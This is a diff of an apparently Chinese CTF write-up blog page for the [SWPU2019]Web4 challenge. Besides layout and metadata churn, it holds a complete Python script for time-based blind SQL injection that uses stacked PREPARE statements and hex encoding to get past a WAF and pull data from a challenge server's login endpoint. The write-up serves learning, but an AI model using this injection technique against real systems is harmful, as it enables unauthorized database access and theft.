@@ -76,7 +76,7 @@ zty153’s_blog = 网安 = web学习</title>
       <i class="ic i-pen"></i>
     </span>
     <span class="text">Symbols count in article</span>
-    <span>3.2k</span>
+    <span>3.1k</span>
     <span class="text">words</span>
   </span>
   <span class="item" title="Reading time">
@@ -117,12 +117,12 @@ zty153’s_blog = 网安 = web学习</title>
       </div>
       <div id="imgs" class="pjax">
         <ul>
-          <li class="item" data-background-image="https://www.loliapi.com/acg/?546768"></li>
-          <li class="item" data-background-image="https://www.loliapi.com/acg/?498727"></li>
-          <li class="item" data-background-image="https://www.loliapi.com/acg/?73959"></li>
-          <li class="item" data-background-image="https://www.loliapi.com/acg/?24184"></li>
-          <li class="item" data-background-image="https://www.loliapi.com/acg/?274983"></li>
-          <li class="item" data-background-image="https://www.loliapi.com/acg/?195983"></li>
+          <li class="item" data-background-image="https://www.loliapi.com/acg/?491416"></li>
+          <li class="item" data-background-image="https://www.loliapi.com/acg/?94782"></li>
+          <li class="item" data-background-image="https://www.loliapi.com/acg/?517737"></li>
+          <li class="item" data-background-image="https://www.loliapi.com/acg/?77743"></li>
+          <li class="item" data-background-image="https://www.loliapi.com/acg/?229076"></li>
+          <li class="item" data-background-image="https://www.loliapi.com/acg/?752358"></li>
         </ul>
       </div>
     </header>
@@ -182,68 +182,7 @@ zty153’s_blog = 网安 = web学习</title>
 <p>尝试  <code>1';show databases;</code>  之类的操作，一直显示密码错误，猜测可能关键字被 waf 了，因为是堆叠，我们可以参考新春战疫的一道堆叠注入（当时也是 PDO），使用预编译 + 16 进制编码绕过 waf。</p>
 <p>而且页面不会根据我们输入情况回显不同，那么就用时间盲注；</p>
 <p>exp：</p>
-<pre><code># by wh1sper
-# 时间盲注
-import requests
-import time
- 
-host = 'http://fe683617-4ef1-4c6a-8332-febe7058c07e.node3.buuoj.cn/index.php?r=Login/Login'
- 
- 
-def mid(bot, top):
-    return (int)(0.5 * (top + bot))
- 
-def char_to_hex(str):
-    res = ''
-    for i in str:
-        res += hex(ord(i))
-    res = '0x' + res.replace('0x', '')
-    return res
- 
- 
-def sqli():
-    name = ''
-    for j in range(1, 250):
-        top = 126
-        bot = 32
-        while 1:
-            #babyselect = 'database()'#---&gt;ctf
-            #babyselect = '(select group_concat(table_name) ' \
-            #             'from information_schema.tables where table_schema=database())'#---flag
-            # babyselect = '(select group_concat(column_name) ' \
-            #             'from information_schema.columns where table_name='flag')'#---&gt;flag
-            babyselect = '(select flag from flag)'#---&gt;glzjin_wants_a_girl_friend.zip
-            select = &quot;select if((ascii(substr(&quot; +babyselect+ &quot;,&#123;&#125;,1))&gt; &#123;&#125;),sleep(3),1);&quot;\
-                .format(j, mid(bot, top))
-            playload = &quot;1';set @a=&quot;+ char_to_hex(select) +&quot;;PREPARE test from @a;execute test;&quot;
- 
-            data = &#123;
-                &quot;username&quot;: playload,
-                &quot;password&quot;: &quot;1&quot;
-            &#125;
-            print(mid(bot, top))
-            start_time = time.time()
-            r = requests.post(url=host, json=data)
-            end_tmie = time.time()
-            #print(r.text)
-            if end_tmie - start_time &gt; 1.5:  # 成功
-                if top - 1 == bot:  # top和bot相邻，说明name是top
-                    name += chr(top)
-                    print(name)
-                    break
-                bot = mid(bot, top)  # 成功就上移bot
-            else:  # 失败
-                if top - 1 == bot:  # top和bot相邻，加上失败，说明name是bot
-                    name += chr(bot)
-                    print(name)
-                    break
-                top = mid(bot, top)  # 失败就下移top
- 
- 
-if __name__ == '__main__':
-    sqli()
-</code></pre>
-<p>得到：glzjin_wants_a_girl_friend.zip</p>
+<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment"># by wh1sper</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment"># 时间盲注</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">import</span> requests</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">import</span> time</pre></td></tr><tr><td data-num="5"></td><td><pre> </pre></td></tr><tr><td data-num="6"></td><td><pre>host <span class="token operator">=</span> <span class="token string">'http://fe683617-4ef1-4c6a-8332-febe7058c07e.node3.buuoj.cn/index.php?r=Login/Login'</span></pre></td></tr><tr><td data-num="7"></td><td><pre> </pre></td></tr><tr><td data-num="8"></td><td><pre> </pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token keyword">def</span> <span class="token function">mid</span><span class="token punctuation">(</span>bot<span class="token punctuation">,</span> top<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">0.5</span> <span class="token operator">*</span> <span class="token punctuation">(</span>top <span class="token operator">+</span> bot<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre> </pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token keyword">def</span> <span class="token function">char_to_hex</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    res <span class="token operator">=</span> <span class="token string">''</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="15"></td><td><pre>        res <span class="token operator">+=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    res <span class="token operator">=</span> <span class="token string">'0x'</span> <span class="token operator">+</span> res<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token keyword">return</span> res</pre></td></tr><tr><td data-num="18"></td><td><pre> </pre></td></tr><tr><td data-num="19"></td><td><pre> </pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token keyword">def</span> <span class="token function">sqli</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    name <span class="token operator">=</span> <span class="token string">''</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">250</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="23"></td><td><pre>        top <span class="token operator">=</span> <span class="token number">126</span></pre></td></tr><tr><td data-num="24"></td><td><pre>        bot <span class="token operator">=</span> <span class="token number">32</span></pre></td></tr><tr><td data-num="25"></td><td><pre>        <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="26"></td><td><pre>            <span class="token comment">#babyselect = 'database()'#--->ctf</span></pre></td></tr><tr><td data-num="27"></td><td><pre>            <span class="token comment">#babyselect = '(select group_concat(table_name) ' \</span></pre></td></tr><tr><td data-num="28"></td><td><pre>            <span class="token comment">#             'from information_schema.tables where table_schema=database())'#---flag</span></pre></td></tr><tr><td data-num="29"></td><td><pre>            <span class="token comment"># babyselect = '(select group_concat(column_name) ' \</span></pre></td></tr><tr><td data-num="30"></td><td><pre>            <span class="token comment">#             'from information_schema.columns where table_name='flag')'#--->flag</span></pre></td></tr><tr><td data-num="31"></td><td><pre>            babyselect <span class="token operator">=</span> <span class="token string">'(select flag from flag)'</span><span class="token comment">#--->glzjin_wants_a_girl_friend.zip</span></pre></td></tr><tr><td data-num="32"></td><td><pre>            select <span class="token operator">=</span> <span class="token string">"select if((ascii(substr("</span> <span class="token operator">+</span>babyselect<span class="token operator">+</span> <span class="token string">",&#123;&#125;,1))> &#123;&#125;),sleep(3),1);"</span>\</pre></td></tr><tr><td data-num="33"></td><td><pre>                <span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span> mid<span class="token punctuation">(</span>bot<span class="token punctuation">,</span> top<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="34"></td><td><pre>            playload <span class="token operator">=</span> <span class="token string">"1';set @a="</span><span class="token operator">+</span> char_to_hex<span class="token punctuation">(</span>select<span class="token punctuation">)</span> <span class="token operator">+</span><span class="token string">";PREPARE test from @a;execute test;"</span></pre></td></tr><tr><td data-num="35"></td><td><pre> </pre></td></tr><tr><td data-num="36"></td><td><pre>            data <span class="token operator">=</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="37"></td><td><pre>                <span class="token string">"username"</span><span class="token punctuation">:</span> playload<span class="token punctuation">,</span></pre></td></tr><tr><td data-num="38"></td><td><pre>                <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string">"1"</span></pre></td></tr><tr><td data-num="39"></td><td><pre>            <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="40"></td><td><pre>            <span class="token keyword">print</span><span class="token punctuation">(</span>mid<span class="token punctuation">(</span>bot<span class="token punctuation">,</span> top<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="41"></td><td><pre>            start_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="42"></td><td><pre>            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>host<span class="token punctuation">,</span> json<span class="token operator">=</span>data<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="43"></td><td><pre>            end_tmie <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="44"></td><td><pre>            <span class="token comment">#print(r.text)</span></pre></td></tr><tr><td data-num="45"></td><td><pre>            <span class="token keyword">if</span> end_tmie <span class="token operator">-</span> start_time <span class="token operator">></span> <span class="token number">1.5</span><span class="token punctuation">:</span>  <span class="token comment"># 成功</span></pre></td></tr><tr><td data-num="46"></td><td><pre>                <span class="token keyword">if</span> top <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">==</span> bot<span class="token punctuation">:</span>  <span class="token comment"># top 和 bot 相邻，说明 name 是 top</span></pre></td></tr><tr><td data-num="47"></td><td><pre>                    name <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>top<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="48"></td><td><pre>                    <span class="token keyword">print</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="49"></td><td><pre>                    <span class="token keyword">break</span></pre></td></tr><tr><td data-num="50"></td><td><pre>                bot <span class="token operator">=</span> mid<span class="token punctuation">(</span>bot<span class="token punctuation">,</span> top<span class="token punctuation">)</span>  <span class="token comment"># 成功就上移 bot</span></pre></td></tr><tr><td data-num="51"></td><td><pre>            <span class="token keyword">else</span><span class="token punctuation">:</span>  <span class="token comment"># 失败</span></pre></td></tr><tr><td data-num="52"></td><td><pre>                <span class="token keyword">if</span> top <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">==</span> bot<span class="token punctuation">:</span>  <span class="token comment"># top 和 bot 相邻，加上失败，说明 name 是 bot</span></pre></td></tr><tr><td data-num="53"></td><td><pre>                    name <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>bot<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="54"></td><td><pre>                    <span class="token keyword">print</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="55"></td><td><pre>                    <span class="token keyword">break</span></pre></td></tr><tr><td data-num="56"></td><td><pre>                top <span class="token operator">=</span> mid<span class="token punctuation">(</span>bot<span class="token punctuation">,</span> top<span class="token punctuation">)</span>  <span class="token comment"># 失败就下移 top</span></pre></td></tr><tr><td data-num="57"></td><td><pre> </pre></td></tr><tr><td data-num="58"></td><td><pre> </pre></td></tr><tr><td data-num="59"></td><td><pre><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="60"></td><td><pre>    sqli<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>得到：glzjin_wants_a_girl_friend.zip</p>
 <p>然后看的出来是个文件，访问下载之，得到网站源码。 很明显，我们要通过某种方法将 flag.php 中的文件内容给读取出来。</p>
 <p>这是个 MVC 模型，首先了解一下该框架下 url 的解析过程：</p>
 <ul>
@@ -299,7 +238,7 @@ if __name__ == '__main__':
       <i class="ic i-calendar-check"></i>
     </span>
     <span class="text">Edited on</span>
-    <time title="Modified: 2024-09-08 20:52:28" itemprop="dateModified" datetime="2024-09-08T20:52:28+08:00">2024-09-08</time>
+    <time title="Modified: 2025-10-09 21:48:04" itemprop="dateModified" datetime="2025-10-09T21:48:04+08:00">2025-10-09</time>
   </span>
   <span id="2024/09/06/SWPU2019-Web4/" class="item leancloud_visitors" data-flag-title="[SWPU2019]Web4" title="Views">
       <span class="icon">
@@ -362,7 +301,7 @@ if __name__ == '__main__':
     <div class="item left">
       
 
-  <a href="/2024/09/05/pasecactf-2019-flask-ssti/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;www.loliapi.com&#x2F;acg&#x2F;?225970" title="[pasecactf_2019]flask_ssti">
+  <a href="/2024/09/05/pasecactf-2019-flask-ssti/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;www.loliapi.com&#x2F;acg&#x2F;?689981" title="[pasecactf_2019]flask_ssti">
   <span class="type">Previous Post</span>
   <span class="category"><i class="ic i-flag"></i> 刷题笔记</span>
   <h3>[pasecactf_2019]flask_ssti</h3>
@@ -372,7 +311,7 @@ if __name__ == '__main__':
     <div class="item right">
       
 
-  <a href="/2024/09/06/WMCTF2020-MakePHPGreatAgain2-0/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;www.loliapi.com&#x2F;acg&#x2F;?62741" title="[WMCTF2020]MakePHPGreatAgain2.0">
+  <a href="/2024/09/06/WMCTF2020-MakePHPGreatAgain2-0/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;www.loliapi.com&#x2F;acg&#x2F;?825740" title="[WMCTF2020]MakePHPGreatAgain2.0">
   <span class="type">Next Post</span>
   <span class="category"><i class="ic i-flag"></i> 刷题笔记</span>
   <h3>[WMCTF2020]MakePHPGreatAgain2.0</h3>
@@ -477,9 +416,41 @@ if __name__ == '__main__':
     
 <div class="breadcrumb">
 <a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
+<i class="ic i-angle-right"></i>
+<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/ssti/" title="In ssti">ssti</a>
 </div>
 
-    <span><a href="/2024/06/11/HarekazeCTF2019-encode-and-encode/" title="[HarekazeCTF2019]encode_and_encode">[HarekazeCTF2019]encode_and_encode</a></span>
+    <span><a href="/2024/06/13/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Unfinish/" title="[网鼎杯2018]Unfinish">[网鼎杯2018]Unfinish</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="In 学习笔记">学习笔记</a>
+</div>
+
+    <span><a href="/2024/10/07/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" title="反序列化漏洞总结">反序列化漏洞总结</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/misc/" title="In misc">misc</a>
+</div>
+
+    <span><a href="/2025/05/06/MRCTF2020-ezmisc/" title="[MRCTF2020]ezmisc">[MRCTF2020]ezmisc</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="In 漏洞复现">漏洞复现</a>
+</div>
+
+    <span><a href="/2025/03/18/activeMQ/" title="CVE-2015-5254">CVE-2015-5254</a></span>
   </li>
 
       
@@ -489,7 +460,37 @@ if __name__ == '__main__':
 <a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
 </div>
 
-    <span><a href="/2024/11/05/HFCTF2021Quals-Unsetme/" title="[HFCTF2021Quals]Unsetme">[HFCTF2021Quals]Unsetme</a></span>
+    <span><a href="/2024/12/10/De1CTF-2019-Giftbox/" title="[De1CTF_2019]Giftbox">[De1CTF_2019]Giftbox</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
+</div>
+
+    <span><a href="/2024/04/29/5-txt/" title="buuctf4月29日">buuctf4月29日</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
+</div>
+
+    <span><a href="/2025/03/13/%E8%B0%81%E8%B5%A2%E4%BA%86%E6%AF%94%E8%B5%9B%EF%BC%9F/" title="谁赢了比赛？">谁赢了比赛？</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
+</div>
+
+    <span><a href="/2024/09/22/RoarCTF2019-SimpleUpload/" title="[RoarCTF2019]SimpleUpload">[RoarCTF2019]SimpleUpload</a></span>
   </li>
 
       
@@ -509,67 +510,7 @@ if __name__ == '__main__':
 <a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
 </div>
 
-    <span><a href="/2024/11/18/FBCTF2019-Products-Manager/" title="[FBCTF2019]Products-Manager">[FBCTF2019]Products-Manager</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="In 学习笔记">学习笔记</a>
-</div>
-
-    <span><a href="/2023/12/17/php%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="PHP学习笔记">PHP学习笔记</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/misc/" title="In misc">misc</a>
-</div>
-
-    <span><a href="/2025/05/06/MRCTF2020-ezmisc/" title="[MRCTF2020]ezmisc">[MRCTF2020]ezmisc</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
-</div>
-
-    <span><a href="/2024/09/18/Quals-Bnv/" title="Quals]Bnv">Quals]Bnv</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
-</div>
-
-    <span><a href="/2024/11/04/2021%E7%A5%A5%E4%BA%91%E6%9D%AF-PackageManager2021/" title="[2021祥云杯]PackageManager2021">[2021祥云杯]PackageManager2021</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
-</div>
-
-    <span><a href="/2024/05/05/5%E6%9C%885%E6%97%A5buu/" title="buuctf5月5日">buuctf5月5日</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
-</div>
-
-    <span><a href="/2025/03/16/NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-R-C-E/" title="[NewStarCTF-2023-公开赛道]R!!!C!!!E!!!">[NewStarCTF-2023-公开赛道]R!!!C!!!E!!!</a></span>
+    <span><a href="/2024/06/20/Mars/" title="[b01lers2020]lifeMars">[b01lers2020]lifeMars</a></span>
   </li>
 
   </ul>
@@ -594,13 +535,13 @@ if __name__ == '__main__':
     <span class="post-meta-item-icon">
       <i class="ic i-chart-area"></i>
     </span>
-    <span title="Symbols count total">683k words</span>
+    <span title="Symbols count total">697k words</span>
 
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="ic i-coffee"></i>
     </span>
-    <span title="Reading time total">10:21</span>
+    <span title="Reading time total">10:34</span>
   </div>
   <div class="powered-by">
     Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
